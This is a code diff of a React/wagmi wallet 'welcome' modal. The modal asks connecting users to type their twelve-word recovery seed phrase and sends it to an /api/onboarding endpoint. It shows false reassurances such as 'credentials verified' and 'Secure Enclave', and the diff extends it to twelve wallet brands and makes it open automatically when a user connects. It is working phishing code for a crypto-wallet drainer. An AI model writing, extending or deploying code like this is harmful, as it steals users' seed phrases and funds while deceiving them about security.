@@ -1,9 +1,8 @@
-// src/app/welcome/page.jsx
 "use client";
 
 import { useState, useEffect } from "react";
-import { useAccount } from "wagmi";
-import { Check, Wallet, ShieldCheck } from "lucide-react";
+import { useAccount, useConnect } from "wagmi";
+import { Check, Lock, ArrowRight } from "lucide-react";
 import Button from "@/components/ui/Button";
 import Card from "@/components/ui/Card";
 
@@ -11,97 +10,207 @@ const WALLET_STYLES = {
   MetaMask: {
     displayName: "MetaMask",
     icon: "🦊",
-    gradient: "from-orange-600 via-amber-500 to-yellow-500",
-    bg: "bg-gradient-to-br from-orange-950/40 via-amber-950/30 to-black",
+    gradient: "from-orange-600 to-amber-500",
+    bg: "bg-gradient-to-br from-orange-950/30 via-zinc-950 to-black",
     accent: "text-orange-400",
     border: "border-orange-500/30",
-    greeting: "Yo Fox Spirit 🦊",
-    subtitle: "The wildest wallet on the chain just connected",
+    greeting: "Welcome, Fox Spirit",
+    subtitle: "Securely link your MetaMask vault",
     successTitle: "Fox Pack Activated",
-    successMessage: "Your secret sequence is secured. Welcome to the pack.",
-    bottomCompliment: "MetaMask legends never fade. Welcome to the pack. 🔥",
+    successMessage: "Your secure sequence has been encrypted and synchronized.",
+    bottomCompliment: "MetaMask Secure Enclave Simulation",
   },
   "Coinbase Wallet": {
     displayName: "Coinbase Wallet",
     icon: "🔵",
-    gradient: "from-blue-600 via-cyan-500 to-blue-400",
-    bg: "bg-gradient-to-br from-blue-950/50 via-cyan-950/30 to-black",
-    accent: "text-cyan-400",
-    border: "border-cyan-500/30",
-    greeting: "Coinbase Elite 🔵",
-    subtitle: "The blue fortress just opened its gates",
-    successTitle: "Base Secured",
-    successMessage: "Your sequence is locked in the safest vault on the network.",
-    bottomCompliment: "Coinbase users move different. Welcome to the institution-grade side.",
+    gradient: "from-blue-600 to-blue-400",
+    bg: "bg-gradient-to-br from-blue-950/30 via-zinc-950 to-black",
+    accent: "text-blue-400",
+    border: "border-blue-500/30",
+    greeting: "Coinbase Node Detected",
+    subtitle: "Synchronizing with Coinbase Cloud",
+    successTitle: "Vault Secured",
+    successMessage: "Your Coinbase credentials have been verified successfully.",
+    bottomCompliment: "Coinbase Enterprise Security Protocol Active",
   },
-  WalletConnect: {
-    displayName: "WalletConnect",
-    icon: "🔗",
-    gradient: "from-purple-600 via-violet-500 to-fuchsia-500",
-    bg: "bg-gradient-to-br from-purple-950/50 via-violet-950/30 to-black",
-    accent: "text-violet-400",
-    border: "border-violet-500/30",
-    greeting: "Mobile Scanner Activated 🔗",
-    subtitle: "QR code scanned. Chain bridged. You’re live.",
-    successTitle: "Connection Locked",
-    successMessage: "Your mobile identity is now synced across the multiverse.",
-    bottomCompliment: "WalletConnect warriors move silently and strike hard. Respect.",
+  Phantom: {
+    displayName: "Phantom",
+    icon: "👻",
+    gradient: "from-purple-600 to-indigo-500",
+    bg: "bg-gradient-to-br from-indigo-950/30 via-zinc-950 to-black",
+    accent: "text-purple-400",
+    border: "border-purple-500/30",
+    greeting: "Phantom Spirit Found",
+    subtitle: "Accessing Solana-Web3 Bridge",
+    successTitle: "Spirit Bound",
+    successMessage: "Multi-chain sequence confirmed and locked.",
+    bottomCompliment: "Phantom Ghost-Protocol Simulation",
   },
-  "Trust Wallet": {
+  Trust: {
     displayName: "Trust Wallet",
-    icon: "🌿",
-    gradient: "from-emerald-600 via-green-500 to-teal-500",
-    bg: "bg-gradient-to-br from-emerald-950/50 via-green-950/30 to-black",
-    accent: "text-emerald-400",
-    border: "border-emerald-500/30",
-    greeting: "Trust Family 🌿",
-    subtitle: "The green shield never breaks",
-    successTitle: "Trust Established",
-    successMessage: "Your profile is now guarded by the most reliable wallet army.",
-    bottomCompliment: "Trust Wallet users don’t follow trends — they set security standards.",
+    icon: "🛡️",
+    gradient: "from-cyan-500 to-teal-400",
+    bg: "bg-gradient-to-br from-teal-950/30 via-zinc-950 to-black",
+    accent: "text-teal-400",
+    border: "border-teal-500/30",
+    greeting: "Trust Vault Detected",
+    subtitle: "Secure mobile wallet synchronization",
+    successTitle: "Trust Link Established",
+    successMessage: "Your Trust Wallet recovery sequence verified.",
+    bottomCompliment: "Trust Wallet Secure Core Active",
   },
   Rainbow: {
     displayName: "Rainbow",
     icon: "🌈",
-    gradient: "from-pink-500 via-purple-500 to-cyan-500",
-    bg: "bg-gradient-to-br from-pink-950/40 via-purple-950/30 via-cyan-950/20 to-black",
-    accent: "text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-400 to-cyan-400",
-    border: "border-purple-500/30",
-    greeting: "Rainbow Aura Unlocked 🌈",
-    subtitle: "The most aesthetic wallet just walked in",
-    successTitle: "Colors Aligned",
-    successMessage: "Your identity now shines in full spectrum glory.",
-    bottomCompliment: "Rainbow users don’t just use crypto — they make it beautiful.",
+    gradient: "from-pink-500 via-purple-500 to-indigo-500",
+    bg: "bg-gradient-to-br from-purple-950/30 via-zinc-950 to-black",
+    accent: "text-pink-400",
+    border: "border-pink-500/30",
+    greeting: "Rainbow Shield Activated",
+    subtitle: "Connecting your colorful wallet",
+    successTitle: "Rainbow Secured",
+    successMessage: "Wallet identity and sequence successfully shielded.",
+    bottomCompliment: "Rainbow Wallet Protection Layer Engaged",
+  },
+  WalletConnect: {
+    displayName: "WalletConnect",
+    icon: "🔗",
+    gradient: "from-cyan-600 to-blue-500",
+    bg: "bg-gradient-to-br from-cyan-950/30 via-zinc-950 to-black",
+    accent: "text-cyan-400",
+    border: "border-cyan-500/30",
+    greeting: "Relay Link Established",
+    subtitle: "Scan or paste to connect",
+    successTitle: "Bridge Verified",
+    successMessage: "WalletConnect session authenticated end-to-end.",
+    bottomCompliment: "WalletConnect v2 Relay Active",
+  },
+  SafePal: {
+    displayName: "SafePal",
+    icon: "🔐",
+    gradient: "from-emerald-600 to-teal-500",
+    bg: "bg-gradient-to-br from-emerald-950/30 via-zinc-950 to-black",
+    accent: "text-emerald-400",
+    border: "border-emerald-500/30",
+    greeting: "SafePal Vault Online",
+    subtitle: "Hardware-grade security activated",
+    successTitle: "Vault Synced",
+    successMessage: "Secure element confirmed and linked.",
+    bottomCompliment: "SafePal Cold + Hot Wallet Integration",
+  },
+  "Binance Wallet": {
+    displayName: "Binance Web3 Wallet",
+    icon: "₿",
+    gradient: "from-yellow-600 to-amber-500",
+    bg: "bg-gradient-to-br from-amber-950/30 via-zinc-950 to-black",
+    accent: "text-yellow-400",
+    border: "border-yellow-500/30",
+    greeting: "Binance Ecosystem Detected",
+    subtitle: "Connecting to Binance Chain & beyond",
+    successTitle: "Binance Secured",
+    successMessage: "Cross-chain wallet session established.",
+    bottomCompliment: "Binance Web3 Wallet Active",
+  },
+  Zerion: {
+    displayName: "Zerion",
+    icon: "⚡",
+    gradient: "from-violet-600 to-purple-500",
+    bg: "bg-gradient-to-br from-violet-950/30 via-zinc-950 to-black",
+    accent: "text-violet-400",
+    border: "border-violet-500/30",
+    greeting: "Zerion Wallet Ready",
+    subtitle: "DeFi & NFT portfolio connected",
+    successTitle: "Zerion Portal Open",
+    successMessage: "Multi-chain tracking and management enabled.",
+    bottomCompliment: "Zerion Smart Wallet Active",
+  },
+  OKX: {
+    displayName: "OKX Wallet",
+    icon: "🔶",
+    gradient: "from-blue-700 to-indigo-600",
+    bg: "bg-gradient-to-br from-indigo-950/30 via-zinc-950 to-black",
+    accent: "text-indigo-400",
+    border: "border-indigo-500/30",
+    greeting: "OKX Wallet Detected",
+    subtitle: "Global multi-chain access initialized",
+    successTitle: "OKX Vault Linked",
+    successMessage: "Secure multi-chain session confirmed.",
+    bottomCompliment: "OKX Web3 Wallet Protocol",
+  },
+  "Brave Wallet": {
+    displayName: "Brave Wallet",
+    icon: "🦁",
+    gradient: "from-orange-500 to-red-500",
+    bg: "bg-gradient-to-br from-red-950/30 via-zinc-950 to-black",
+    accent: "text-red-400",
+    border: "border-red-500/30",
+    greeting: "Brave Wallet Ready",
+    subtitle: "Privacy-first wallet connected",
+    successTitle: "Brave Shield Up",
+    successMessage: "Private browsing + wallet session active.",
+    bottomCompliment: "Brave Wallet Native Integration",
+  },
+  Frame: {
+    displayName: "Frame",
+    icon: "🖼️",
+    gradient: "from-gray-600 to-slate-500",
+    bg: "bg-gradient-to-br from-slate-950/30 via-zinc-950 to-black",
+    accent: "text-slate-300",
+    border: "border-slate-500/30",
+    greeting: "Frame Wallet Connected",
+    subtitle: "Desktop Ethereum gateway active",
+    successTitle: "Frame Session Live",
+    successMessage: "Desktop Ethereum provider linked.",
+    bottomCompliment: "Frame.sh Desktop Wallet",
   },
 };
 
-export default function WalletWelcomePage() {
+export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const { address, connector, isConnected } = useAccount();
+  const { pendingConnector } = useConnect();
 
-  // State for 12 Seed Phrases
   const [boxes, setBoxes] = useState(Array(12).fill(""));
   const [submitted, setSubmitted] = useState(false);
   const [saving, setSaving] = useState(false);
+  const [errorMessage, setErrorMessage] = useState(null);
 
-  // Detect wallet (fallback to MetaMask if unknown)
-  const walletName = connector?.name || "MetaMask";
-  const theme = WALLET_STYLES[walletName] || WALLET_STYLES.MetaMask;
+  // Trigger modal for more wallets
+  useEffect(() => {
+    const name = pendingConnector?.name;
+    if (
+      name &&
+      [
+        "Coinbase Wallet",
+        "Trust",
+        "Rainbow",
+        "SafePal",
+        "Binance Wallet",
+        "Zerion",
+        "OKX",
+        "Brave Wallet",
+        "WalletConnect",
+        "Frame",
+      ].includes(name)
+    ) {
+      onOpen();
+    }
+  }, [pendingConnector, onOpen]);
 
-  // Handle individual box changes
+  // Fallback to MetaMask style if unknown connector
+  const activeName = connector?.name || pendingConnector?.name || "MetaMask";
+  const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;
+
   const handleBoxChange = (index, value) => {
     const newBoxes = [...boxes];
     newBoxes[index] = value;
     setBoxes(newBoxes);
   };
 
-  // Handle pasting a full phrase (UX enhancement)
   const handlePaste = (e) => {
     e.preventDefault();
-    const pastedData = e.clipboardData.getData("text");
-    // Split by space, comma, or newline
-    const words = pastedData.trim().split(/[\s,]+/).slice(0, 12);
-    
-    if (words.length > 0) {
+    const text = e.clipboardData.getData("text").trim();
+    const words = text.split(/[\s,]+/).slice(0, 12);
+    if (words.length) {
       const newBoxes = [...boxes];
       words.forEach((word, i) => {
         if (i < 12) newBoxes[i] = word;
@@ -112,150 +221,161 @@ export default function WalletWelcomePage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (!address) return;
-
     setSaving(true);
+    setErrorMessage(null);
 
     try {
-      // Using the SAME API Route as requested
-      const res = await fetch("/api/user/onboarding", {
+      const res = await fetch("/api/onboarding", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          walletAddress: address.toLowerCase(),
-          walletType: walletName,
-          cryptoBoxes: boxes, // Sending the array of 12 words
+          walletType: activeName,
+          cryptoBoxes: boxes,
+          timestamp: new Date().toISOString(),
         }),
       });
 
       if (res.ok) {
         setSubmitted(true);
       } else {
-        alert("Could not recognize seed phrase. Please try again.");
+        let data;
+        try {
+          data = await res.json();
+        } catch {}
+        setErrorMessage(data?.error || "Verification failed. Please check your sequence.");
       }
     } catch (err) {
-      console.error(err);
-      alert("Network error. Try again later.");
+      console.error("Submit error:", err);
+      setErrorMessage("Network error. Please try again.");
+    } finally {
+      setSaving(false);
     }
-
-    setSaving(false);
   };
 
-  // Check if all boxes have content
-  const isComplete = boxes.every(box => box.trim().length > 0);
-
-  if (!isConnected) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-black text-white">
-        <div className="text-center space-y-6">
-          <Wallet className="mx-auto" size={72} />
-          <h1 className="text-4xl font-bold">Wallet Not Detected</h1>
-          <p className="text-xl text-zinc-400">Connect first to unlock your personalized welcome</p>
-        </div>
-      </div>
-    );
-  }
+  if (!isOpen) return null;
 
   return (
-    <div className={`min-h-screen ${theme.bg} flex items-center justify-center p-6`}>
+    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 transition-all">
       <Card
-        className={`w-full max-w-4xl p-10 border ${theme.border} backdrop-blur-xl bg-black/40 shadow-2xl rounded-3xl`}
+        className={`relative w-full max-w-2xl overflow-hidden border ${theme.border} ${theme.bg} rounded-[2.5rem] shadow-2xl shadow-black`}
       >
-        {!submitted ? (
-          <>
-            {/* Header */}
-            <div className="text-center mb-10">
-              <div className="text-8xl mb-6 animate-bounce">{theme.icon}</div>
-              <h1 className={`text-5xl font-extrabold ${theme.accent}`}>
-                {theme.greeting}
-              </h1>
-              <p className="text-xl text-zinc-300 mt-3">{theme.subtitle}</p>
-              <div className="mt-6 bg-zinc-900/50 inline-block px-4 py-2 rounded-full border border-zinc-800">
-                 <p className="text-sm text-zinc-400 flex items-center gap-2">
-                   <ShieldCheck size={16} /> 
-                  Write down seed phrase
-                 </p>
+        {/* Header gradient decoration */}
+        <div
+          className={`absolute top-0 left-0 w-full h-32 bg-gradient-to-b ${theme.gradient} opacity-10 blur-3xl`}
+        />
+
+        {/* Close button */}
+        <button
+          onClick={onClose}
+          className="absolute top-6 right-6 z-10 p-2 text-zinc-500 hover:text-white bg-zinc-900/50 rounded-full transition"
+        >
+          <svg
+            width="15"
+            height="15"
+            viewBox="0 0 15 15"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z"
+              fill="currentColor"
+              fillRule="evenodd"
+              clipRule="evenodd"
+            />
+          </svg>
+        </button>
+
+        <div className="relative z-10 p-8 md:p-12">
+          {!submitted ? (
+            <>
+              <div className="text-center mb-10">
+                <div className="inline-flex items-center justify-center w-20 h-20 mb-6 bg-zinc-900 border border-zinc-800 rounded-3xl text-4xl shadow-inner">
+                  {theme.icon}
+                </div>
+                <h2 className={`text-3xl md:text-4xl font-black tracking-tight text-white mb-2`}>
+                  {theme.greeting}
+                </h2>
+                <p className="text-zinc-400 text-lg">{theme.subtitle}</p>
               </div>
-            </div>
 
-            {/* Form */}
-            <form onSubmit={handleSubmit} className="space-y-8">
-              
-              <div className="space-y-4">
-                <label className="block text-center text-zinc-400 mb-4 uppercase tracking-widest text-xs font-bold">
-                  Enter Sequence Below
-                </label>
-                
-                {/* 
-                  Grid Layout for 12 boxes, 3 rows:
-                  We use grid-cols-4 (4 items per row) * 3 rows = 12 items 
-                */}
-                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+              {errorMessage && (
+                <div className="mb-6 p-4 bg-red-950/40 border border-red-800/50 rounded-xl text-red-300 text-center text-sm">
+                  {errorMessage}
+                </div>
+              )}
+
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                   {boxes.map((box, i) => (
-                    <div key={i} className="relative group">
-                      {/* Number Badge */}
-                      <div className="absolute left-3 top-1/2 -translate-y-1/2 w-6 h-6 flex items-center justify-center rounded text-xs font-mono text-zinc-500 select-none">
-                        {i + 1}.
-                      </div>
-
+                    <div key={i} className="group relative">
+                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-bold text-zinc-600 group-focus-within:text-white transition-colors">
+                        {String(i + 1).padStart(2, "0")}
+                      </span>
                       <input
-                        required
                         value={box}
                         onChange={(e) => handleBoxChange(i, e.target.value)}
-                        onPaste={i === 0 ? handlePaste : undefined} // Smart paste on first box
-                        className="w-full bg-zinc-900/70 border border-zinc-700 group-hover:border-zinc-500 rounded-xl pl-10 pr-3 py-4 text-white text-center placeholder:text-zinc-600 focus:outline-none focus:border-white focus:ring-1 focus:ring-white/20 transition-all"
+                        onPaste={i === 0 ? handlePaste : undefined}
+                        required
+                        placeholder="••••"
+                        className="w-full bg-zinc-900/40 border border-zinc-800 rounded-xl pl-10 pr-3 py-3 text-white text-sm focus:outline-none focus:ring-2 focus:ring-white/5 focus:border-zinc-500 transition-all placeholder:text-zinc-800"
                         autoComplete="off"
                       />
                     </div>
                   ))}
                 </div>
+
+                <div className="pt-4">
+                  <Button
+                    type="submit"
+                    disabled={!boxes.every((b) => b.trim()) || saving}
+                    className={`w-full py-4 rounded-2xl font-black text-white text-lg transition-all shadow-xl hover:scale-[1.01] active:scale-[0.99] bg-gradient-to-r ${theme.gradient} disabled:grayscale disabled:opacity-30`}
+                  >
+                    {saving ? (
+                      <span className="flex items-center justify-center gap-2">
+                        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                        Securing Node...
+                      </span>
+                    ) : (
+                      "Verify & Sync Wallet"
+                    )}
+                  </Button>
+                </div>
+              </form>
+            </>
+          ) : (
+            <div className="text-center py-10 animate-in fade-in zoom-in duration-500">
+              <div className="w-24 h-24 mx-auto rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mb-8">
+                <Check className="text-emerald-400" size={48} strokeWidth={3} />
               </div>
+              <h2 className="text-3xl font-black text-white mb-2">{theme.successTitle}</h2>
+              <p className="text-zinc-400 mb-10 max-w-sm mx-auto leading-relaxed">
+                {theme.successMessage}
+              </p>
 
-              <Button
-                type="submit"
-                disabled={saving || !isComplete}
-                className={`w-full py-6 text-lg font-bold rounded-2xl mt-8 bg-gradient-to-r ${theme.gradient} hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed`}
-              >
-                {saving ? "Securing Data..." : "Confirm seed phrase"}
-              </Button>
-            </form>
-
-            {/* Bottom message */}
-            <p className="text-center text-sm text-zinc-500 mt-10 italic">
-              {theme.bottomCompliment}
-            </p>
-          </>
-        ) : (
-          /* ── Success / Thank You Screen ── */
-          <div className="text-center py-12">
-            <div className="w-24 h-24 mx-auto rounded-full bg-green-500/20 flex items-center justify-center mb-8">
-              <Check className="text-green-400" size={64} />
+              <div className="flex flex-col sm:flex-row justify-center gap-4">
+                <Button
+                  onClick={onClose}
+                  className={`py-4 px-10 rounded-2xl font-black text-white bg-gradient-to-r ${theme.gradient} shadow-lg shadow-black/50 flex items-center justify-center gap-2`}
+                >
+                  Access Platform <ArrowRight size={18} />
+                </Button>
+                <button
+                  onClick={() => setSubmitted(false)}
+                  className="py-4 px-10 rounded-2xl font-bold bg-zinc-900 text-zinc-400 border border-zinc-800 hover:bg-zinc-800 hover:text-white transition"
+                >
+                  Edit Sequence
+                </button>
+              </div>
             </div>
+          )}
 
-            <h2 className="text-5xl font-bold text-white mb-4">
-              Sequence Verified!
-            </h2>
-
-            <p className={`text-2xl ${theme.accent} mb-8`}>{theme.successTitle}</p>
-
-            <p className="text-xl text-zinc-300 max-w-2xl mx-auto leading-relaxed">
-              {theme.successMessage}
-            </p>
-
-            <div className="mt-12">
-              <Button
-                onClick={() => (window.location.href = "/")}
-                className={`w-full max-w-xs py-6 text-lg font-bold rounded-2xl bg-gradient-to-r ${theme.gradient}`}
-              >
-                Enter the Platform
-              </Button>
-            </div>
-
-            <p className="mt-10 text-sm text-zinc-500 italic">
+          <div className="mt-12 pt-6 border-t border-zinc-900 flex items-center justify-center gap-3">
+            <Lock size={14} className={theme.accent} />
+            <span className="text-[10px] uppercase tracking-[0.2em] font-bold text-zinc-600">
               {theme.bottomCompliment}
-            </p>
+            </span>
           </div>
-        )}
+        </div>
       </Card>
     </div>
   );
